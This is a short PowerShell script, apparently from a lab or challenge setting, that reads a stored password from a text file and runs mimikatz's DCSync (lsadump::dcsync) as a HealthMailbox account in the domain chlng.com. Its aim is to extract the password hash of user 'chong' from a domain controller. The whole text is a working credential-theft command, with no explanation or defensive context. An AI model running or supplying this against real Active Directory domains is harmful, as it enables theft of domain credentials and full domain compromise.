$password = Get-Content C:\\ProgramData\\password.txt
$argV = "`"lsadump::dcsync /domain:chlng.com /user:chong /authuser:HealthMailbox88fa07b /authdomain:chlng.com /authpassword:$($password) /authntlm`" exit"

C:\ProgramData\mimikatz\x64\mimikatz.exe $argV